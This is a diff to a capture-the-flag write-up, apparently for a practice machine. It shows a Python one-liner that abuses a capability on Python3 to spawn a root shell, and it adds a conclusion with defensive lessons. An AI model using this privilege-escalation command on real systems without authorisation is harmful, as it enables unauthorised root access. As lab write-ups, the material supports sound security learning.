@@ -105,7 +105,7 @@ def capture():
 ......
 ```
 
-Looks like Python3 has SUID flag, the `getcap` command will allow us to check this.  
+Looks like Python3 has SUID flag, the `getcap`command will allow us to check this.  
 We can modify the app.py command string to spawn a root shell.
 
 ```bash
@@ -119,4 +119,9 @@ $ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 # whoami
 root
 ```
+
+## Conclusion
+
+This machine is quite straight forward, but we can get a couple of takeaways:  
+Be mindful of what is exposed in your website, don't reuse credentials and don't grant unrestricted sudo permissions.
 
